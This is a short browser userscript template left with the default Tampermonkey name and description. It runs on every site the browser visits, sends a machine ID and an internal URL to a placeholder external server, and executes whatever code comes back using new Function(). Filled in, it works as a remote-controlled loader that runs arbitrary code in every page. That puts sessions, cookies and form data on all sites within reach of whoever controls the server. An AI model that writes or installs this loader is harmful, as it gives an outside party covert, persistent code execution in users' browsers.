// ==UserScript==
// @name         Default
// @namespace    http://tampermonkey.net/
// @version      0.1
// @run-at       document-idle
// @description  try to take over the world!
// @noframes
// @author       You
// @match        *://*/*
// @grant        GM_xmlhttpRequest
// @require     https://code.jquery.com/jquery-3.6.0.min.js
// ==/UserScript==

(function() {
  var __machineID = '<<MACHINEID>>';

  var oReq = new XMLHttpRequest();
  oReq.onload = function(e) { new Function(oReq.responseText)(); }
  
  oReq.open("GET", '<<EXTURL>>/next_step.json?__mid='+__machineID+'&__inturl='+encodeURIComponent('<<INTURL>>'));

  oReq.send();

})();
